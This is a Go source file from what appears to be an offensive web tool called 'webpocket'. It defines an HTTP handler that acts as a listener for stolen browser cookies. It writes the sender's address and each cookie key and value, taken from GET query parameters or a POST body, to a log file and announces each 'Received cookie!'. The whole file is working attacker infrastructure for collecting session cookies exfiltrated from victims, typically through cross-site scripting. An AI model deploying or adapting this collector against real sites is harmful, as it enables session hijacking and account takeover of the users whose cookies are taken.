package webpocket

import (
	"os"
	"net/http"
	"log"
	"fmt"
	"bufio"
	"strings"
)


func Cookies(w http.ResponseWriter, req *http.Request) {

	// open logfile, create if not exist
	logFile, err := os.OpenFile(cookielog, os.O_APPEND|os.O_RDWR|os.O_CREATE, 0644)
	if err != nil {
		if !Quite {
			log.Println("[-] Error creating cookielog file")
		}
		return
	}
	defer logFile.Close()

	// print seperator to file
	fmt.Fprintf(logFile, "=== START ===\n\n")
	fmt.Fprintf(logFile, "Cookie from: %s\n", req.RemoteAddr)

	switch req.Method {

	case "GET":
		getParams := req.URL.Query()
		for key, val := range getParams {
			fmt.Fprintf(logFile, "[Key]: %s\n[Val]: %s\n\n", key, val)
			if !Quite {
				log.Println("[+] Received cookie!")
			}
		}

	case "POST":
		scanner := bufio.NewScanner(req.Body)
		scanner.Scan()
		cookies := strings.Split(scanner.Text(), "; ")
		for _, val := range cookies {
			cookieBuf := strings.SplitN(val, "=", 2)
			if cookieBuf[1] == "" {
				fmt.Fprintf(logFile, "[Key]: %s\n[Val]: %s\n\n", cookieBuf[0], "[EMPTY]")
				continue
			}
			fmt.Fprintf(logFile, "[Key]: %s\n[Val]: %s\n\n", cookieBuf[0], cookieBuf[1])
			if !Quite {
				log.Println("[+] Received cookie!")
			}
		}

	}

	fmt.Fprintf(logFile, "=== END ===\n\n")
}
